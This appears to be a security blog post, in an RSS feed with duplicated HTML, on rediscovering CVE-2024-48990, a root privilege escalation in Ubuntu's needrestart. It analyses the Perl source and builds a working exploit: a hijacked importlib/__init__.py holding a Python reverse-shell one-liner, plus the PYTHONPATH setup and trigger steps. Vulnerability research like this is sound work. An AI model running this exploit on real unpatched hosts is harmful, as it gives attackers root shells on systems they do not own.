&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./importlib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./importlib/__init__.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./main.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The contents of &lt;code&gt;main.py&lt;/code&gt; are below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ main.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import sys
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In &lt;code&gt;./importlib/__init__.py&lt;/code&gt;, I write Python code that will create a &lt;code&gt;hacked.txt&lt;/code&gt; file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat ./importlib/__init__.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import os
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;os.system&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;touch hacked.txt&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s put this idea to the test! I will &lt;code&gt;export PYTHONPATH=/tmp/needrestart&lt;/code&gt; and manually replicate the &lt;code&gt;python&lt;/code&gt; process that &lt;code&gt;needrestart&lt;/code&gt; executes.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ally-petitt.com:443/images/needrestart-testing-importlib.png&#34; alt=&#34;The &amp;lt;code&amp;gt;hacked.txt&amp;lt;/code&amp;gt; file being created after importing &amp;lt;code&amp;gt;sys&amp;lt;/code&amp;gt; with the modified &amp;lt;code&amp;gt;PYTHONPATH&amp;lt;/code&amp;gt; value pointing to &amp;lt;code&amp;gt;/tmp/needrestart&amp;lt;/code&amp;gt;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;It works! Let&amp;rsquo;s see if we can port this attack directly to &lt;code&gt;needrestart&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;launching-the-exploit&#34;&gt;Launching the exploit&lt;/h2&gt;
&lt;p&gt;I modified &lt;code&gt;main.py&lt;/code&gt; to be an infinite loop so that it continues running while &lt;code&gt;needrestart&lt;/code&gt; is searching the process list. The purpose of this file is to simply trigger the Python interpreter scan with our desired &lt;code&gt;PYTHONPATH&lt;/code&gt; value.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat main.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; True:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	pass
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s up the ante here and get a reverse shell as root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat importlib/__init__.py 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import os,pty,socket;s&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;socket.socket&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;s.connect&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;,1337&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;os.dup2&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s.fileno&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;,f&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; f in&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0,1,2&lt;span style=&#34;color:#f92672&#34;&gt;)]&lt;/span&gt;;pty.spawn&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sh&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I executed &lt;code&gt;python3 ./main.py&lt;/code&gt; with our malicious &lt;code&gt;PYTHONPATH&lt;/code&gt; variable.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ export PYTHONPATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/tmp/needrestart
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ python3 ./main.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In a separate terminal, I verified that our process was showing up and the desired &lt;code&gt;PYTHONPATH&lt;/code&gt; variable was set in the way that &lt;code&gt;needrestart&lt;/code&gt; would read it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ps ax | grep python3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;428477&lt;/span&gt; pts/13   R+     0:03 python3 ./main.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat /proc/428477/environ | grep --text -oP &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PYTHONPATH[^\x00]*&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# verify our environment variable shows up&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PYTHONPATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/tmp/needrestart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;Note: Make sure that the python3 binary that you are running is located at a path that follows this regex pattern for &lt;code&gt;needrestart&lt;/code&gt; to recognize it as a valid Python program: &lt;code&gt;^/usr/(local/)?bin/python([23][.\d]*)?$&lt;/code&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Our target binary is famously triggered as the result of a hook in a package manager after actions such as installing a new package. Let&amp;rsquo;s see what happens when I set up a &lt;code&gt;nc&lt;/code&gt; listener and attempt to install &lt;code&gt;nano&lt;/code&gt; using &lt;code&gt;apt&lt;/code&gt;!&lt;/p&gt;
&lt;video width=&#34;100%&#34; controls&gt;
    &lt;source src=&#34;https://ally-petitt.com:443/videos/CVE-2024-48990_poc.mp4&#34; type=&#34;video/mp4&#34;&gt;
&lt;/video&gt;
&lt;p&gt;It worked! We have successfully identified and exploited the n-day CVE-2024-48990. Thanks for reading!&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="/images/ubuntu-logo.png" alt="Ubuntu logo"  />
</p>
<h1 id="introduction">Introduction</h1>
<p>On November 19th, 2024, Qualys publicly disclosed five local privilege escalation vulnerabilities discovered in the <code>needrestart</code> binary that comes installed by default on Ubuntu Server installations. They disclose the technical details of these <a href="https://www.qualys.com/2024/11/19/needrestart/needrestart.txt">here</a>, however, I will be attempting to rediscover CVE-2024-48990 prior to reading the technical details based purely on the information from the CVE description and references. Then, I will create my own exploit that gives me a reverse shell as root.</p>
<p>I have never used <code>needrestart</code> and I have very little familiarity with Perl, so I am going in blind. Let&rsquo;s find an N-day!</p>
<p><strong>TL;DR</strong>: I was able to set PYTHONPATH to a location where I created a fake <code>importlib</code> implementation that triggered a reverse shell as root via library path hijacking. The exploit files can be found on my <a href="https://github.com/ally-petitt/CVE-2024-48990-Exploit">Github</a>.</p>
<h2 id="becoming-familiar-with-needrestart">Becoming Familiar with <code>needrestart</code></h2>
<p>I will begin by cloning the <code>needrestart</code> repository and getting a high-level overview of what it does.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/liske/needrestart
</span></span></code></pre></div><p>A glance at the <a href="https://github.com/liske/needrestart/blob/master/README.md">README</a> reveals the purpose of <code>needrestart</code>:</p>
<blockquote>
<p><em>needrestart</em> checks which daemons need to be restarted after library upgrades.</p>
</blockquote>
<p>It seems that <code>needrestart</code> is invoked by package managers via hook scripts in <code>/ex</code> after library upgrades. Of course, package managers like <code>apt</code> are typically executed with root privileges, which makes <code>needrestart</code> a target for Local Privilege Escalation (LPE) vulnerabilities.</p>
<p>I installed <code>needrestart</code> from the Ubuntu repositories to interact with it directly.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt install needrestart
</span></span><span style="display:flex;"><span>$ needrestart --version
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>needrestart 3.6 - Restart daemons after library updates.
</span></span><span style="display:flex;"><span>-- snip --
</span></span></code></pre></div><p>Since this is version 3.6 and the patch was introduced in version 3.8, this <code>needrestart</code> installation is vulnerable.</p>
<h1 id="tracking-down-cve-2024-48990">Tracking Down CVE-2024-48990</h1>
<p>The <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48990">description</a> of this CVE is the following:</p>
<blockquote>
<p>Qualys discovered that needrestart, before version 3.8, allows local attackers to execute arbitrary code as root by tricking needrestart into running the Python interpreter with an attacker-controlled PYTHONPATH environment variable.</p>
</blockquote>
<p>Additionally, a <a href="https://github.com/liske/needrestart/commit/fcc9a4401392231bef4ef5ed026a0d7a275149ab">patch</a> on the file <code>perl/lib/NeedRestart/Interp/Python.pm</code> is linked in the CVE references section with the commit message &ldquo;interp: do not set PYTHONPATH environment variable to prevent a LPE&rdquo;. These are very substantial hints.</p>
<p>The patched file is in the <code>NeedRestart::Interp::Python</code> module. This module was specified in the README as a part of the <code>needrestart</code> interpreter scanning feature, which searches for outdated source code files in Python, Ruby, Perl, and Java.</p>
<h2 id="pythonpath-explained">PYTHONPATH explained</h2>
<p>According to the official <a href="https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH">Python documentation</a>, <code>PYTHONPATH</code> defines the default search path for module files that are imported. In fact, I have used PYTHONPATH within CTF competitions to execute my own user-controlled Python code with executed privileges via library path hijacking.</p>
<h2 id="pythonpath-assignment-in-needrestart">PYTHONPATH Assignment in <code>needrestart</code></h2>
<p>Let&rsquo;s look at how <code>PYTHONPATH</code> is being set within <code>needrestart</code>. I will checkout to a vulnerable version of the source code to look further.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git checkout tags/v3.6
</span></span></code></pre></div><p>I used the search functionality to locate where <code>PYTHONPATH</code> is being set within the <code>files()</code> subroutine.</p>
<p><img loading="lazy" src="/images/needrestart-pythonpath.png" alt=""  />
</p>
<p>The <code>nr_parse_env()</code> subroutine above is defined in <code>perl/lib/NeedRestart/Utils.pm</code> and reads the <code>/proc/&lt;pid&gt;/environ</code> file of the Python process that it is checking and returns an array of the environment variables used by that process.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">nr_parse_env</span>($) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> $pid <span style="color:#f92672">=</span> shift;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> $fh;
</span></span><span style="display:flex;"><span>    open($fh, <span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#34;/proc/$pid/environ&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">return</span> (); <span style="color:#75715e"># read environment variables from environ file</span>
</span></span><span style="display:flex;"><span>    local $/ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\000&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> @env <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;$fh&gt;</span>;
</span></span><span style="display:flex;"><span>    chomp(@env);
</span></span><span style="display:flex;"><span>    close($fh);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> map { (<span style="color:#e6db74">/^([^=]+)=(.*)$/</span> ? ($1, $2) : ()) } @env;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Scrolling to lines 202-207 of <code>perl/lib/NeedRestart/Interp/Python.pm</code> sheds some insight into the Python code that is executed after the <code>PYTHONPATH</code> environment variable is set.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>    <span style="color:#75715e"># get include path</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> ($pyread, $pywrite) <span style="color:#f92672">=</span> nr_fork_pipe2($self<span style="color:#f92672">-&gt;</span>{debug}, $ptable<span style="color:#f92672">-&gt;</span>{exec}, <span style="color:#e6db74">&#39;-&#39;</span>); <span style="color:#75715e"># Equivalent to `python -` on the CLI</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">print</span> $pywrite <span style="color:#e6db74">&#34;import sys\nprint(sys.path)\n&#34;</span>; <span style="color:#75715e"># This code is passed into Python&#39;s stdin</span>
</span></span><span style="display:flex;"><span>    close($pywrite);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> ($path) <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;$pyread&gt;</span>;
</span></span><span style="display:flex;"><span>    close($pyread);
</span></span></code></pre></div><p>At a high level, this is a breakdown of the most relevant steps from the code shared so far:</p>
<ol>
<li>The <code>files()</code> subroutine of the Python interpreter checker is called with the PID of a Python process as the argument.</li>
<li>The environment variables associated with that process are parsed.
<ul>
<li>If a <code>PYTHONPATH</code> environment variable is found, <code>$ENV</code> is set to contain that value.</li>
</ul>
</li>
<li>A forked process of Python is being launched where the code <code>import sys\nprint(sys.path)\n</code> is being executed.</li>
</ol>
<h3 id="the-env-variable">The <code>%ENV</code> Variable</h3>
<p>As stated in the <a href="https://perldoc.perl.org/Env">Perl documentation</a>, &ldquo;Perl maintains environment variables in a special hash named %ENV&rdquo;.</p>
<p>Even though <code>%ENV</code> is not explicitly passed as a parameter to the child Python process that is being created by <code>needrestart</code>, Perl will still carry over those values behind the scenes, which is why the value of <code>%ENV</code> is significant.</p>
<h3 id="seed-of-an-attack-idea">Seed of an Attack Idea</h3>
<p>A potential attack strategy is forming: launch a Python process with the <code>PYTHONPATH</code> set to an attacker-controlled directory and perform a library path hijacking attack to execute arbitrary Python code.</p>
<p>Before we can create a proof-of-concept for this idea, however, we must first verify that we can do the following:</p>
<ul>
<li>Trigger the Python interpreter scan to check an attacker-controlled process.</li>
<li>Identify a Python library that can be hijacked.
<ul>
<li>The imported module <code>sys</code> is built-in to Python and does not rely on an external module path. Since Python does not search through external files in the search path for <code>sys</code>, we will have to be more creative with our approach.</li>
</ul>
</li>
</ul>
<h3 id="triggering-the-python-interpreter-check">Triggering the Python Interpreter Check</h3>
<p>As <a href="/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/#tracking-down-cve-2024-48990">previously mentioned</a>, <code>needrestart</code> supports interpreter checks on Python, Ruby, Perl, and Java programs. These interpreter checks are iteratively invoked by the <code>needrestart_interp_check()</code> subroutine on a given process in <code>perl/lib/NeedRestart.pm</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">needrestart_interp_check</span>($$$$$) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> $debug <span style="color:#f92672">=</span> shift;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> $pid <span style="color:#f92672">=</span> shift;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> <span style="color:#66d9ef">my</span> $interp (values %Interps) { <span style="color:#75715e"># iterate through Python, Ruby, Perl, and Java interpreter checkers</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($interp<span style="color:#f92672">-&gt;</span>isa($pid, $bin)) { <span style="color:#75715e"># check that argv[0] of the process is supported by the current interpreter checker</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">my</span> %files <span style="color:#f92672">=</span> $interp<span style="color:#f92672">-&gt;</span>files($pid, <span style="color:#f92672">\</span>%InterpCache); <span style="color:#75715e"># call the vulnerable files() subroutine on the process</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>In turn, <code>needrestart_interp_check()</code> is called in line 584 by the main <code>/needrestart</code> Perl script when <code>$restart</code> is false and <code>interpscan</code> is not disabled by the configuration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>	<span style="color:#66d9ef">unless</span>($restart <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>$nrconf{interpscan}) {
</span></span><span style="display:flex;"><span>	    $restart<span style="color:#f92672">++</span> <span style="color:#66d9ef">if</span>(needrestart_interp_check($nrconf{verbosity} <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>, $pid, $exe, $nrconf{blacklist_interp}, $opt_t));
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></div><p>Luckily, <code>$nrconf{interpscan}</code> is enabled by default.</p>
<p><img loading="lazy" src="/images/needrestart-nrconf.png" alt="&lt;code&gt;$nrconf{interpscan}&lt;/code&gt; being set to 0"  />
</p>
<p>Another factor to consider is the PID that is being passed to <code>needrestart_interp_check()</code> since that corresponds with the process that the <code>PYTHONPATH</code> environment variable is being read from. Searching for the value of <code>$pid</code> in <code>/needrestart</code> reveals that the program iterates through a list of PIDs stored in <code>$ptable</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> $ptable <span style="color:#f92672">=</span> nr_ptable();
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">my</span> $pid (sort {$a <span style="color:#e6db74">&lt;=&gt;</span> $b} keys %$ptable) {
</span></span></code></pre></div><p>The <code>$ptable</code> hash is populated with a list of all process objects accessible to the user executing <code>needrestart</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">my</span> %ptable;
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    local $SIG{__WARN__} <span style="color:#f92672">=</span> <span style="color:#66d9ef">sub</span> {};
</span></span><span style="display:flex;"><span>    %ptable <span style="color:#f92672">=</span> map {$_<span style="color:#f92672">-&gt;</span>pid <span style="color:#f92672">=&gt;</span> $_} @{ <span style="color:#66d9ef">new</span> Proc::ProcessTable(enable_ttys <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">-&gt;</span>table };
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">nr_ptable</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">\</span>%ptable;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This verifies that we will be able to invoke <code>needrestart_interp_check()</code> with the PID of our malicious process since all of the processes are iterated through.</p>
<h1 id="exploit-development">Exploit Development</h1>
<h2 id="flushing-out-the-plan">Flushing out the Plan</h2>
<p>Since I couldn&rsquo;t do library path hijacking with the built-in <code>sys</code> module, I thought about other options that I could target within the short Python snippet <code>import sys\nprint(sys.path)</code> that is executed in <code>Python.pm</code>.</p>
<p>There are two other notable tokens aside from <code>sys</code>: <code>print</code> and <code>import</code>. I decided to read more about how <code>import</code> in the official <a href="https://docs.python.org/3/reference/simple_stmts.html#import">documentation</a>. In particular, this snippet from the docs stood out to me:</p>
<blockquote>
<p>importlib.import_module() is provided to support applications that determine dynamically the modules to be loaded.</p>
</blockquote>
<p>It seems that using the <code>import</code> statement in python can trigger the <code>importlib</code> module. I used the <code>find</code> command to verify that <code>importlib</code> is indeed a dynamically loaded library rather than a Python built-in like <code>sys</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ find / -name importlib 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/lib/python3.12/importlib
</span></span></code></pre></div><p>Maybe we can take advantage of <code>importlib</code> being dynamically loaded along with the fact that the contents of <code>__init__.py</code> are automatically executed when a module is loaded. I created a directory in <code>/tmp/needrestart</code> with the following structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./importlib
</span></span><span style="display:flex;"><span>./importlib/__init__.py
</span></span><span style="display:flex;"><span>./main.py
</span></span></code></pre></div><p>The contents of <code>main.py</code> are below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ main.py
</span></span><span style="display:flex;"><span>import sys
</span></span></code></pre></div><p>In <code>./importlib/__init__.py</code>, I write Python code that will create a <code>hacked.txt</code> file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat ./importlib/__init__.py
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;touch hacked.txt&#34;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Let&rsquo;s put this idea to the test! I will <code>export PYTHONPATH=/tmp/needrestart</code> and manually replicate the <code>python</code> process that <code>needrestart</code> executes.</p>
<p><img loading="lazy" src="/images/needrestart-testing-importlib.png" alt="The &lt;code&gt;hacked.txt&lt;/code&gt; file being created after importing &lt;code&gt;sys&lt;/code&gt; with the modified &lt;code&gt;PYTHONPATH&lt;/code&gt; value pointing to &lt;code&gt;/tmp/needrestart&lt;/code&gt;"  />
</p>
<p>It works! Let&rsquo;s see if we can port this attack directly to <code>needrestart</code>.</p>
<h2 id="launching-the-exploit">Launching the exploit</h2>
<p>I modified <code>main.py</code> to be an infinite loop so that it continues running while <code>needrestart</code> is searching the process list. The purpose of this file is to simply trigger the Python interpreter scan with our desired <code>PYTHONPATH</code> value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat main.py
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> True:
</span></span><span style="display:flex;"><span>	pass
</span></span></code></pre></div><p>Let&rsquo;s up the ante here and get a reverse shell as root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat importlib/__init__.py 
</span></span><span style="display:flex;"><span>import os,pty,socket;s<span style="color:#f92672">=</span>socket.socket<span style="color:#f92672">()</span>;s.connect<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,1337<span style="color:#f92672">))</span>;<span style="color:#f92672">[</span>os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,f<span style="color:#f92672">)</span><span style="color:#66d9ef">for</span> f in<span style="color:#f92672">(</span>0,1,2<span style="color:#f92672">)]</span>;pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sh&#34;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>I executed <code>python3 ./main.py</code> with our malicious <code>PYTHONPATH</code> variable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ export PYTHONPATH<span style="color:#f92672">=</span>/tmp/needrestart
</span></span><span style="display:flex;"><span>$ python3 ./main.py
</span></span></code></pre></div><p>In a separate terminal, I verified that our process was showing up and the desired <code>PYTHONPATH</code> variable was set in the way that <code>needrestart</code> would read it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ps ax | grep python3
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">428477</span> pts/13   R+     0:03 python3 ./main.py
</span></span><span style="display:flex;"><span>$ cat /proc/428477/environ | grep --text -oP <span style="color:#e6db74">&#39;PYTHONPATH[^\x00]*&#39;</span> <span style="color:#75715e"># verify our environment variable shows up</span>
</span></span><span style="display:flex;"><span>PYTHONPATH<span style="color:#f92672">=</span>/tmp/needrestart
</span></span></code></pre></div><p><em>Note: Make sure that the python3 binary that you are running is located at a path that follows this regex pattern for <code>needrestart</code> to recognize it as a valid Python program: <code>^/usr/(local/)?bin/python([23][.\d]*)?$</code>.</em></p>
